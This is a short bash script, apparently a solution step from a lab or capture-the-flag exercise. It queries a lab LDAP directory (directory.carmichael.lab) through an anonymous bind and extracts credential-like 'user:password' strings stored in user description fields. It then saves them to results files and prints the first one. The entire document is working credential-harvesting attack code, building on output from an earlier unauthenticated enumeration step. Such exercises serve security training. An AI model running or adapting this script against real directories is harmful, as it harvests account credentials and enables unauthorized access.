#!/bin/bash
mkdir -p results tmp_ldap
basedn=$(sed -n '2p' results/2-snmp_ldap_unauth.txt 2>/dev/null)
[ -z "$basedn" ] && { echo "no base DN from task 2" >&2; exit 1; }
ldapsearch -x -LLL -H ldap://directory.carmichael.lab -b "$basedn" "(objectClass=person)" description uid 2>/dev/null |
  awk -F': ' '/^description: / {print $2}' | grep -E '^[A-Za-z0-9._-]+:[^ ]+$' > results/9-credential_candidates.txt
credential=$(ldapsearch -x -LLL -H ldap://directory.carmichael.lab -b "$basedn" "(objectClass=person)" description uid 2>/dev/null |
  awk -F': ' '/^description: / {print $2}' |
  grep -E '^[A-Za-z0-9._-]+:[^ ]+$' | head -n 1)
cred=$credential
printf '%s\n' "$cred" | tee results/9-ldap_description_hunt.txt
